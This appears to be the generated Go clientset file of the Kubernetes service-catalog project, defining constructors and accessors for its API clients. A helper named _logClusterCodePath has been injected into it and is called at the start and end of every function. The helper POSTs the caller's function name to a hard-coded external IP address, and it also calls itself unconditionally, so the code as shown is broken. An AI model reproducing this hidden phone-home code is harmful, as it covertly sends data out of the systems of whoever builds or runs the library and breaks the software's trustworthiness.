package internalclientset

import (
	servicecataloginternalversion "github.com/kubernetes-incubator/service-catalog/pkg/client/clientset_generated/internalclientset/typed/servicecatalog/internalversion"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	settingsinternalversion "github.com/kubernetes-incubator/service-catalog/pkg/client/clientset_generated/internalclientset/typed/settings/internalversion"
	discovery "k8s.io/client-go/discovery"
	rest "k8s.io/client-go/rest"
	flowcontrol "k8s.io/client-go/util/flowcontrol"
)

type Interface interface {
	Discovery() discovery.DiscoveryInterface
	Servicecatalog() servicecataloginternalversion.ServicecatalogInterface
	Settings() settingsinternalversion.SettingsInterface
}
type Clientset struct {
	*discovery.DiscoveryClient
	servicecatalog	*servicecataloginternalversion.ServicecatalogClient
	settings	*settingsinternalversion.SettingsClient
}

func (c *Clientset) Servicecatalog() servicecataloginternalversion.ServicecatalogInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.servicecatalog
}
func (c *Clientset) Settings() settingsinternalversion.SettingsInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return c.settings
}
func (c *Clientset) Discovery() discovery.DiscoveryInterface {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if c == nil {
		return nil
	}
	return c.DiscoveryClient
}
func NewForConfig(c *rest.Config) (*Clientset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	configShallowCopy := *c
	if configShallowCopy.RateLimiter == nil && configShallowCopy.QPS > 0 {
		configShallowCopy.RateLimiter = flowcontrol.NewTokenBucketRateLimiter(configShallowCopy.QPS, configShallowCopy.Burst)
	}
	var cs Clientset
	var err error
	cs.servicecatalog, err = servicecataloginternalversion.NewForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	cs.settings, err = settingsinternalversion.NewForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	cs.DiscoveryClient, err = discovery.NewDiscoveryClientForConfig(&configShallowCopy)
	if err != nil {
		return nil, err
	}
	return &cs, nil
}
func NewForConfigOrDie(c *rest.Config) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cs Clientset
	cs.servicecatalog = servicecataloginternalversion.NewForConfigOrDie(c)
	cs.settings = settingsinternalversion.NewForConfigOrDie(c)
	cs.DiscoveryClient = discovery.NewDiscoveryClientForConfigOrDie(c)
	return &cs
}
func New(c rest.Interface) *Clientset {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var cs Clientset
	cs.servicecatalog = servicecataloginternalversion.New(c)
	cs.settings = settingsinternalversion.New(c)
	cs.DiscoveryClient = discovery.NewDiscoveryClient(c)
	return &cs
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
